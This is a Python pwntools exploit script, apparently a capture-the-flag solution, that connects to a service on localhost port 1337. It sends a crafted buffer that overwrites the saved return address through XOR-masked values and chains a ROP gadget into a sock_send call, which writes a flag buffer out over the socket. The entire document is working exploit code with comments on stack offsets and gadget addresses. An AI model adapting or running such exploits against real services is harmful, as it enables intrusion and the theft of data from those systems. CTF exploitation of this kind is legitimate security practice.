#!/usr/bin/python

from pwn import *



conn = remote('localhost', 1337)

# this builds a reliable chain of calls to func_b2
# just to get us to a stable starting point
payload = "\x80\x90\x14\x90\x14\x90\x14\xf1"
# in function func_b2, count is 68, bufsize is 0x84
# in function func_36, count is 67, bufsize is 0x94
# in function func_b2, count is 66, bufsize is 0x84
# in function func_b2, count is 65, bufsize is 0x84
# in function func_b2, count is 64, bufsize is 0x84
# in function func_b2, count is 63, bufsize is 0x84
# in function func_13, count is 62, bufsize is 0x08

# This has the net effect of xoring the local buffer
# with 0x00 i.e do nothing. Stack Ninja!!
nulls = '\x10'*(6*4 + 1) 

# we need to know the current saved eip 
# so that we know what to xor it with
saved_eip = 0x804e06c
zor = 0x10101010

# going to call sock_send
# int sock_send(int sockfd, char *buf, size_t length);
# sock_send(4, &flag_loc, 256);
sock_send = 0x080487db
flag_loc = 0x805b6c0
sock_fd = 4
pops = 0x805454d #stackCleaning pop esi; pop edi; pop ebp; ret
exit_plt = 0x8048600 #0x0805b604 <got address woops
eip_pop = p32(saved_eip ^ zor ^ pops)

chain = payload + nulls + eip_pop 
chain += p32(zor)+p32(zor)+p32(zor)#+p32(zor)
# chain += p32(zor ^ 0x00000025)
chain += p32(sock_send ^ zor)
chain += p32(zor)
chain += p32(sock_fd ^ zor ^ 0xe1000000)
chain += p32(flag_loc ^ zor) 
chain += p32(0xff ^ zor) # length
# chain += p32(exit_plt ^ zor)
# chain += p32(0x00000000 ^ zor)

with open("payload.txt", 'w+') as f:
	f.write(chain)

conn.sendline(chain)

# conn.recv(1000)
conn.interactive()


